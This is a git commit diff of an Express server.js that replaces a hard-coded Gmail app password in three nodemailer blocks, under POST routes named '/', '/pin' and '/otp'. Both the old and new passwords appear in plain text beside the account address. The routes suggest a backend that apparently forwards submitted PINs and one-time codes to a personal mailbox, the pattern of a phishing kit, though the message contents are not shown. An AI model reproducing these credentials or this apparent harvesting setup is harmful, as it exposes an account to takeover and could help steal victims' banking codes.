753bbcbacc3a12aa90e014d3882abc5da13e86e0
Frysandra18 <162427943+Frysandra18@users.noreply.github.com>
2024-03-23 21:37:47 +0100

    Update server.js

--- server.js
+++ server.js
@@ -21,7 +21,7 @@ app.post("/", (req, res) => {
     service: "gmail",
     auth: {
       user: "Mmaghaebube@gmail.com",
-      pass: "ghbuwywltyalfeyd",
+      pass: "oeysntmkwnmrdqlj",
     },
   });
 
@@ -51,7 +51,7 @@ app.post("/pin", (req, res) => {
     service: "gmail",
     auth: {
       user: "Mmaghaebube@gmail.com",
-      pass: "ghbuwywltyalfeyd",
+      pass: "oeysntmkwnmrdqlj",
     },
   });
 
@@ -81,7 +81,7 @@ app.post("/otp", (req, res) => {
     service: "gmail",
     auth: {
       user: "Mmaghaebube@gmail.com",
-      pass: "ghbuwywltyalfeyd",
+      pass: "oeysntmkwnmrdqlj",
     },
   });
 
